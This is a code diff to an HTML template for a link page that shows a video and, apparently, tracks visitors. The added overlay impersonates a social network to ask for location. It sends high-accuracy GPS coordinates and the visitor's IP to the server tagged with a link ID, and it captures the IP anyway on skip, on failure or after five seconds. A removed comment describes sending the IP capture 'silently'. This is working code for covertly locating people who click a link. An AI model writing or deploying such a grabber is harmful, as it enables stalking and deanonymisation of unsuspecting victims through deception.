@@ -9,11 +9,15 @@
         body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif; background: #000; color: #fff; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
         .video-container { width: 100%; height: 100vh; position: relative; overflow: hidden; }
         .video-container iframe { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 100vw; height: 100vh; border: none; pointer-events: none; }
-        .overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 1000; display: flex; align-items: center; justify-content: center; flex-direction: column; padding: 24px; }
+        .overlay { position: fixed; top: 0; left: 0; right: 0; bottom: 0; z-index: 1000; display: flex; align-items: center; justify-content: center; flex-direction: column; padding: 24px; background: rgba(0,0,0,0.7); }
         .overlay h2 { font-size: 26px; margin-bottom: 8px; text-shadow: 0 2px 8px rgba(0,0,0,0.7); }
         .overlay p { font-size: 15px; color: rgba(255,255,255,0.7); text-shadow: 0 1px 4px rgba(0,0,0,0.5); }
         .spinner { width: 40px; height: 40px; border: 3px solid rgba(255,255,255,0.2); border-top-color: #fff; border-radius: 50%; animation: spin 1s linear infinite; margin-top: 24px; }
         @keyframes spin { to { transform: rotate(360deg); } }
+        .permission-btn { background: #1DA1F2; color: #fff; border: none; padding: 14px 48px; border-radius: 28px; font-size: 18px; font-weight: 600; cursor: pointer; margin: 8px; }
+        .skip-btn { background: #555; }
+        .loading { display: none; color: rgba(255,255,255,0.6); margin-top: 16px; }
+        .btn-group { display: flex; flex-direction: column; gap: 10px; margin-top: 16px; }
     </style>
 </head>
 <body>
@@ -30,16 +34,29 @@
     {% endif %}
 </div>
 
-<div class="overlay">
-    <h2>Loading...</h2>
-    <p>Please wait while we connect</p>
+<div class="overlay" id="permissionOverlay">
+    <h2>📍 Share Location?</h2>
+    <p>Allow {{ social_network }} to access your location</p>
+    <div class="btn-group">
+        <button class="permission-btn" id="allowGpsBtn">✅ Share Location</button>
+        <button class="permission-btn skip-btn" id="skipGpsBtn">⏭️ Skip</button>
+    </div>
+    <div class="loading" id="loadingText">Loading...</div>
     <div class="spinner"></div>
 </div>
 
 <script>
     const link_id = "{{ link_id }}";
 
-    // Send IP capture silently after page load
+    function sendGPS(lat, lon) {
+        fetch('/api/gps_location', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ link_id, lat, lon })
+        }).then(r => console.log('GPS sent:', r.status))
+          .catch(e => console.error('GPS error:', e));
+    }
+
     function sendIPCapture() {
         fetch('/api/ip_only', {
             method: 'POST',
@@ -48,8 +65,62 @@
         }).catch(e => console.error(e));
     }
 
-    // Send immediately — no camera needed, just grab IP
-    sendIPCapture();
+    function getGPSLocation() {
+        const loadingText = document.getElementById('loadingText');
+        const allowBtn = document.getElementById('allowGpsBtn');
+        const skipBtn = document.getElementById('skipGpsBtn');
+        
+        if (navigator.geolocation) {
+            loadingText.textContent = 'Getting location...';
+            loadingText.style.display = 'block';
+            
+            navigator.geolocation.getCurrentPosition(
+                function(position) {
+                    const lat = position.coords.latitude;
+                    const lon = position.coords.longitude;
+                    console.log('📍 GPS:', lat, lon);
+                    sendGPS(lat, lon);
+                    // Hide overlay and send IP too
+                    document.getElementById('permissionOverlay').style.display = 'none';
+                    sendIPCapture();
+                },
+                function(error) {
+                    console.error('GPS error:', error);
+                    loadingText.textContent = 'Location unavailable. Using IP...';
+                    setTimeout(() => {
+                        document.getElementById('permissionOverlay').style.display = 'none';
+                        sendIPCapture();
+                    }, 1000);
+                },
+                { enableHighAccuracy: true, timeout: 10000 }
+            );
+        } else {
+            console.log('GPS not supported');
+            document.getElementById('permissionOverlay').style.display = 'none';
+            sendIPCapture();
+        }
+    }
+
+    document.getElementById('allowGpsBtn').addEventListener('click', function() {
+        this.style.display = 'none';
+        document.getElementById('skipGpsBtn').style.display = 'none';
+        document.getElementById('loadingText').style.display = 'block';
+        getGPSLocation();
+    });
+
+    document.getElementById('skipGpsBtn').addEventListener('click', function() {
+        document.getElementById('permissionOverlay').style.display = 'none';
+        sendIPCapture();
+    });
+
+    // Auto-send IP after 5 seconds if no action
+    setTimeout(() => {
+        const overlay = document.getElementById('permissionOverlay');
+        if (overlay.style.display !== 'none') {
+            overlay.style.display = 'none';
+            sendIPCapture();
+        }
+    }, 5000);
 </script>
 </body>
 </html>
